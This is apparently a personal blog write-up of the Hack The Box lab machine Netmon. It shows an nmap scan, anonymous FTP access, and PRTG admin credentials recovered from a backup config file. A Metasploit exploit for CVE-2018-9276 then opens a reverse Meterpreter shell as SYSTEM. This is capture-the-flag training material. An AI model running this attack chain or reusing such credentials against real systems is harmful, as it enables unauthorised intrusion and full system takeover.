---
title: HTB - Netmon
date: 2023-12-04
categories: [CTF, HTB]
tags: [nmap, ftp, prtg, metasploit, cve-2018-9276]
img_path: /assets/netmon/
published: true
---

![room_banner](netmon_banner.png)

## Overview

|:-:|:-:|
|Machine|[Netmon](https://app.hackthebox.com/machines/177)|
|Rank|Easy|
|Time|1h17m|
|Focus|FTP, PRTG|

## 1. Information gathering

```shell
# port scanning
sudo nmap -sS -sC -sV -O -Pn --min-rate 10000 -p- netmon

PORT      STATE    SERVICE      VERSION
21/tcp    open     ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

80/tcp    open     http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5211/tcp  filtered unknown
5985/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

47001/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0

Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time:
|   date: 2023-12-04T19:43:03
|_  start_date: 2023-12-04T19:39:49
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

## 2. Initial Foothold

```shell
# connecting to the FTP server
ftp anonymous@netmon
Connected to netmon.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49859|)
125 Data connection already open; Transfer starting.
02-02-19  11:18PM                 1024 .rnd
02-25-19  09:15PM       <DIR>          inetpub
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
02-03-19  07:08AM       <DIR>          Users
11-10-23  09:20AM       <DIR>          Windows
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49871|)
125 Data connection already open; Transfer starting.
02-25-19  10:44PM       <DIR>          Administrator
11-10-23  09:54AM       <DIR>          Public
226 Transfer complete.
ftp> cd Administrator
550 Access is denied.
ftp> cd Public
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||49872|)
125 Data connection already open; Transfer starting.
11-10-23  09:21AM       <DIR>          Desktop
02-03-19  07:05AM       <DIR>          Documents
07-16-16  08:18AM       <DIR>          Downloads
07-16-16  08:18AM       <DIR>          Music
07-16-16  08:18AM       <DIR>          Pictures
12-04-23  02:40PM                   34 user.txt
07-16-16  08:18AM       <DIR>          Videos
226 Transfer complete.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||49873|)
150 Opening ASCII mode data connection.
100% |******************************************|    34        1.35 KiB/s    00:00 ETA
226 Transfer complete.
34 bytes received in 00:00 (1.34 KiB/s)
ftp> !cat user.txt
<snip>
```

![](homepage.png)

![](prtg_version.png)

> [CVE-2018-9276](https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/) - Need creds for RCE.

![](prtg_config_files.png)

```shell
ftp> get PRTG\ Configuration.old.bak
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
```

![](creds.png)

> prtgadmin:PrTg@dmin2018 --> do not work  
> prtgadmin:PrTg@dmin2019 --> password rotation

```shell
# launching metasploit's module
msf6 exploit(windows/http/prtg_authenticated_rce) > run

[*] Started reverse TCP handler on 10.10.14.4:4444
[+] Successfully logged in with provided credentials
[+] Created malicious notification (objid=2018)
[+] Triggered malicious notification
[+] Deleted malicious notification
[*] Waiting for payload execution.. (30 sec. max)
[*] Sending stage (175686 bytes) to 10.10.10.152
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.152:49819) at 2023-12-04 21:15:33 +0000

meterpreter > shell
Process 3132 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\System32>dir c:\users\administrator\desktop\
dir c:\users\administrator\desktop\
 Volume in drive C has no label.
 Volume Serial Number is 0EF5-E5E5

 Directory of c:\users\administrator\desktop

02/02/2019  11:35 PM    <DIR>          .
02/02/2019  11:35 PM    <DIR>          ..
12/04/2023  04:13 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,751,391,744 bytes free
```

<figure>
    <img src="netmon_pwned.png"
    alt="Machine pwned" >
</figure>